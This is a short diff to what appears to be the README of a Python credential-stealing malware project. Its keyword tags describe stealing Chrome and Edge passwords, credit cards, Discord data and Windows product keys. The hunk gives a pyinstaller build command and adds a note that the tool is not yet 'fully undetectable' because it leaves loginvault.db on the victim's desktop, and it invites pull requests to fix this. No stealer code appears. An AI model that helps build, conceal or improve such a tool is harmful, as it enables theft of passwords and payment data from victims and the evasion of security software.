@@ -36,6 +36,10 @@ cmd prompt > "cd path/where/python-file/is"
 
 pyinstaller --clean --onefile --icon=icon.ico pythonfile.py
 
+# NOTE :
+
+not fully 100% FUD > loginvault.db is dropped on victim's desktop where file location is, cannot find error/fix
+please open a pull request if you're able to find a fix
 
 <>
 discord, passwords, browsersteal, credit cards, webhooks, python, chrome password stealer, browser password stealer, microsoft edge password stealer, credit card stealer, discord webhooks, windows key, windows product key, stealer
